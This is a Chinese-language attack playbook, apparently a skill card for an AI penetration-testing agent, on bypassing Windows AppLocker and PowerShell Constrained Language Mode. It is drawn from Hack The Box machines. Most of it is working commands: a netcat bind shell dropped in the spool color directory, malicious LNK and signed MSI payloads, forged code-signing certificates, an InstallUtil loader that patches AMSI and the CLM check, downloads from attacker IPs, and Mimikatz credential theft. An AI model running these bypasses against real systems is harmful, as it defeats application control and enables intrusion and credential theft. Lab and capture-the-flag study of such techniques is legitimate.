---
name: 'applocker-clm-bypass'
description: 'AppLocker 与 PowerShell Constrained Language Mode 绕过:可写白名单目录/受信格式(LNK、MSI)/泄露的代码签名证书/32 位未封解释器/CLM 白名单 cmdlet 五条绕过面。看到 "blocked by group policy" 或 New-Object 报错就来查。（检索词：applocker/CLM/ConstrainedLanguage/Constrained Language Mode/whitelist bypass/InstallUtil/signtool/MSI signing/pfx/code signing/签名滥用/spool drivers color/应用白名单/应用控制/语言模式/执行策略/绕过/Constrained-Language-Mode/whitelist-bypass/MSI-signing/code-signing/spool-drivers-color/app locker）'
whenToUse: '拿到 Windows shell 后 PowerShell 落在 ConstrainedLanguage、或上传的 exe/ps1 被执行策略拦下时加载。'
metadata: { domain: ad-win, tier: T2 }
---

# AppLocker 与 PowerShell CLM 绕过

> 来自 Insane 官方 WP 逐台回核,**6 台命中**:Sizzle / Hackback / Ethereal / Sekhmet / Hathor / Rabbit(另有 Fighter 提供 SysWOW64 旁证)。

🔴 **分工边界**:`windows-privesc`(T1 检查表)**不管 AppLocker**,它管令牌/服务/UAC/DLL 劫持/内核 CVE —— 提权面去那张卡。`edr-evasion` 管 **AMSI/ETW/BYOVD/注入**,解决"载荷不被看见";本卡解决"载荷被**允许执行**",两者正交(patch AMSI 不解除 AppLocker 拦截)。

## 触发信号

| 现象 | 含义 |
|------|------|
| `$ExecutionContext.SessionState.LanguageMode` 返回 `ConstrainedLanguage` | CLM 生效(正常是 `FullLanguage`) |
| `New-Object System.Net.Sockets.TCPClient` 报 `Cannot create type. Only core types are allowed in this language mode` | CLM 典型症状,PS 反弹 shell 一写就挂 |
| exe 已写进磁盘,执行时报 `This program is blocked by group policy` | Exe 规则拦截 —— **可写 ≠ 可执行** |
| `.ps1` 报 `cannot be run because it is blocked by group policy` | Script 规则拦截 |
| `HKLM\Software\Policies\Microsoft\Windows\SrpV2` 下有 `Exe`/`Script`/`Msi`/`Dll` 子键 | AppLocker 策略落地 |
| 普通用户一登录 WinRM/webshell 就是 CLM 会话 | 策略来自 GPO,不是你敲出来的 |

## 前置验证

```powershell
$ExecutionContext.SessionState.LanguageMode        # ① 定性
Get-AppLockerPolicy -effective -xml                 # ② 全量有效策略,逐条看 Allow/Deny
Get-AppLockerFileInformation -Path C:\ProgramData\bypass-clm.exe   # ③ 预判候选载荷命中哪条规则
.\accesschk64.exe -w -s -q -u Users "C:\Windows" >> windows.txt -accepteula   # ④ 可写路径
type windows.txt

REG EXPORT HKLM\Software\Policies\Microsoft\Windows\SrpV2\MSI AppLocker-MSI.reg  # ⑤ MSI 是否只放行已签名
type AppLocker-MSI.reg

dir C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe      # ⑥ 解释器两套架构都在吗
dir C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
```

🔴 典型策略信任 Microsoft 发布者 → **Sysinternals 全家能跑**。上传被拦时把 exe 改名 `.txt` 落地,再 `rename-item -path "accesschk64.txt" -newname "accesschk64.exe"` 改回来(Hathor)。

## 模式 1: 可写白名单目录(默认规则漏掉的路径)

条件:Path 规则写了 `%WINDIR%\*` 之类宽白名单,或 Everyone 可写目录被放行。

```cmd
copy nc.exe C:\windows\system32\spool\drivers\color\
C:\windows\system32\spool\drivers\color\nc.exe -lvp 4444 -e cmd.exe
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Sizzle | Covenant `pwn.exe` 落地被拦;`cp pwn.exe C:\Windows\System32\spool\drivers\color` 后原地执行,grunt 上线 |
| Hackback | `UPLOAD nc64.exe C:\users\simple\nc.exe` 无法执行;`copy nc.exe ...\spool\drivers\color\` 后即可运行 |

🔴 Hathor 用 accesschk 扫完 `C:\Windows` 发现**所有可写目录都在策略排除表里** —— 模式 1 死路,立刻转模式 3/4,别反复换目录试。

## 模式 2: 受信格式(LNK / MSI 等被整体放行的扩展名)

条件:策略对 `.lnk`/`.msi` 的管控弱于 `.exe`/`.ps1`(只给 Windows Installer 设 Publisher 规则,或压根没启用该 RuleCollection)。

```cmd
REG EXPORT HKLM\Software\Policies\Microsoft\Windows\SrpV2\MSI AppLocker-MSI.reg
```

```powershell
candle.exe exec.wsx      # MSI:WiX 打包
light.exe exec.wixobj
# LNK:本地复刻造好恶意快捷方式,覆盖目标 Public Desktop 上可写的 .lnk 等点击
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Ethereal | Public Desktop 的 Visual Studio 快捷方式可覆写 → 造 `.lnk`(`cmd.exe /c START "" /MIN` 包 openssl 双管道)覆盖,等 jorge 点击 |

## 模式 3: 有效签名(泄露 / 窃取的代码签名证书)

条件:策略里有 Publisher 规则("Signed by CN=...")。**Publisher 规则下,一枚受信代码签名证书 ≈ 任意脚本/程序执行授权** —— 内容随便改,只要签名对得上。

```cmd
:: Ethereal:D 盘泄露 CA 私钥 → 自签代码签名证书 → 签 MSI
C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer
C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk
certutil -addstore Root MyCA.cer                    :: 本地复刻验证环境
makecert.exe -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic MyCA.cer -iv MyCA.pvk -sv MySPC.pvk MySPC.cer
pvk2pfx.exe -pvk MySPC.pvk -spc MySPC.cer -pfx MySPC.pfx
signtool.exe sign /v /f MySPC.pfx exec-signed.msi
copy exec-signed.msi D:\DEV\MSIs\exec-signed.msi     :: 投给计划任务消费
```

```powershell
# Hathor:回收站捡到的 .pfx → 破口令 → 导入 → 签脚本
Import-PfxCertificate -FilePath C:\share\cert.pfx -Password(ConvertTo-SecureString -String 'abceasyas123' -AsPlainText -Force) -CertStoreLocation Cert:\CurrentUser\My
Set-AuthenticodeSignature <改好的脚本> -Certificate $cert -HashAlgorithm SHA512
cscript c:\get-bADpasswords\run.vbs
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Ethereal | `D:\DEV\Certs` 泄露 `MyCA.cer`/`MyCA.pvk`;策略仅放行已签名 MSI → WiX 打包 → 签名 → 放进 `D:\DEV\MSIs` 等 5 分钟计划任务执行 → ETHEREAL\rupal |
| Hathor | 回收站 `.pfx` → `crackpkcs12` 破出 `abceasyas123`,证书 `CN=Administrator` 用于 Code Signing;Exe/Script 两条 `FilePublisherRule` 都 Allow 该发布者 → 改写 `Get-bADpasswords.ps1` 调 `Get-ADReplAccount -SamAccountName administrator`,签名后 `cscript run.vbs` 触发得 administrator NT hash |

## 模式 4: 未被覆盖的解释器版本(32 位 vs 64 位)

条件:策略按**绝对路径**封解释器,而同一解释器在 `Framework` 与 `Framework64`(或 `System32` 与 `SysWOW64`)下是两份文件,管理员只封了一份。

```powershell
# Sekhmet:策略 Deny 了 Framework64 的 InstallUtil,却漏了 32 位的
# <FilePathRule Name="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" ... Action="Deny">
wget http://10.10.14.12:8000/bypass-clm.exe -o bypass-clm.exe
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\ProgramData\bypass-clm.exe"
```

载荷要点:程序集需 `[System.ComponentModel.RunInstaller(true)]` 的 `Installer` 子类并 override `Uninstall(IDictionary)`,CLM 逃逸在该回调里做(patch `SystemPolicy::GetSystemLockdownPolicy` 为 `48 31 c0 c3`、`amsi.dll!AmsiScanBuffer` 为 `B8 57 00 07 80 C3`,再 `ConsoleShell.Start(...)`)。

```powershell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe   # Fighter 旁证:换架构/换副本
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Sekhmet | 策略 Deny `Framework64\...\InstallUtil.exe`、未封 `Framework\...\InstallUtil.exe`;`/U bypass-clm.exe` 反弹 + 脱离 CLM,随后 `Invoke-Mimikatz dpapi::chrome` 读 Edge 存的 bob.woodADM 口令 |
| Fighter | AppLocker 策略拦 `powershell.exe` 时,SysWOW64 副本与 `System.Management.Automation.dll` 仍是活路 |

🔴 32 位进程加载 64 位程序集会报 `BadImageFormatException`;先确认架构(`[IntPtr]::Size` = 4 即 32 位),必要时 `payload_inject` 切会话架构。

## 模式 5: CLM 下仍可用的白名单 cmdlet

条件:只有语言模式受限,没有(或没查清)执行策略。CLM 拦的是"创建任意 .NET 类型",**不拦白名单内的 cmdlet** —— `Invoke-WebRequest`/`iex` 仍在。

```powershell
# Rabbit:CLM 禁 New-Object,但 Invoke-WebRequest 可用 → 下载免杀二进制再执行
Invoke-WebRequest -Uri http://10.10.14.x/plink.exe -OutFile C:\Users\Public\plink.exe
```

🔴 **免杀二进制比 PS 脚本更稳**:CLM 环境里 PS 反弹 shell 一行都写不出去(全用 `New-Object`)。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Rabbit | 全公司用 OpenOffice 且开 CLM;MSF `exploit/multi/misc/openoffice_document_macro` 生成文档后改 `Basic/Standard/Module1.xml`,用 `Invoke-WebRequest` 下载 Shellter 免杀的 `plink.exe` 执行 |

## 快速检查清单

```bash
[ ] $ExecutionContext.SessionState.LanguageMode          # ConstrainedLanguage?
[ ] Get-AppLockerPolicy -effective -xml                   # 逐条看 Allow/Deny 与 RuleCollection 类型
[ ] Get-AppLockerFileInformation -Path <候选载荷>          # 预判命中哪条规则
[ ] REG EXPORT HKLM\...\SrpV2\MSI                          # MSI 是否只放行已签名
[ ] accesschk64.exe -w -s -q -u Users "C:\Windows"        # 可写路径 vs 白名单路径 交叉比对
[ ] 可写目录被策略排除? → 是则转模式 2/3/4,别换目录碰运气
[ ] 有没有 "Signed by CN=..." 的 Publisher Allow 规则? → 找证书
[ ] 有没有 .pfx/.pvk/.cer 可拿(回收站/共享/D 盘/备份)?
[ ] Framework 与 Framework64 的 InstallUtil 是否只封了一个? SysWOW64 副本呢?
[ ] 只有 CLM 无 AppLocker? → 直接用 Invoke-WebRequest 拉免杀 exe
[ ] 计划任务/服务会消费某个目录? → 签名后投递,别自己双击
```

## 教训

1. **可写 ≠ 可执行** —— AppLocker 是执行期拦截,不是 ACL。先分清是被拦还是没权限。
2. **`Get-AppLockerPolicy -effective -xml` 是唯一权威** —— Sekhmet 整条绕过链就来自"Framework64 被 Deny、Framework 没有"这一行,别凭经验猜默认规则。
3. **Publisher 规则是签名证书的单点依赖** —— 一枚受信证书等于任意脚本执行授权(Hathor 的 `CN=Administrator`)。
4. **受信格式往往比 exe 松** —— LNK/MSI 的 RuleCollection 经常没启用或只做 Publisher 限制。
5. **审计工具能跑,是因为策略信任了 Microsoft 发布者** —— Sysinternals 是被放行的"合法武器"。
6. **CLM 与 AppLocker 分开判断** —— 前者限制语言特性,后者限制文件执行,绕过方式完全不同;不要靠反复换目录碰运气,accesschk 输出与策略白名单做集合交叉一次算清。

## 相关卡

- `windows-privesc` —— 执行策略已绕过、要找本地提权路径时。本卡不覆盖提权面。
- `edr-evasion` —— 载荷能执行但被杀软/EDR 拦(AMSI/ETW/BYOVD/注入)时。与本卡正交。
- `dll-hijacking-practical` —— 目标是借服务/计划任务的 DLL 搜索路径落地时。
- `scf-ntlm-theft` —— 需要的是可写共享投 LNK/SCF 偷 NTLM,而非绕过执行策略时。
- `living-off-the-land` —— 想用系统自带二进制(certutil/bitsadmin/mshta)替代上传工具时。
- `adcs-attack-chain` —— 证书来自 AD CS 而非泄露文件,需要正规签发路径时。
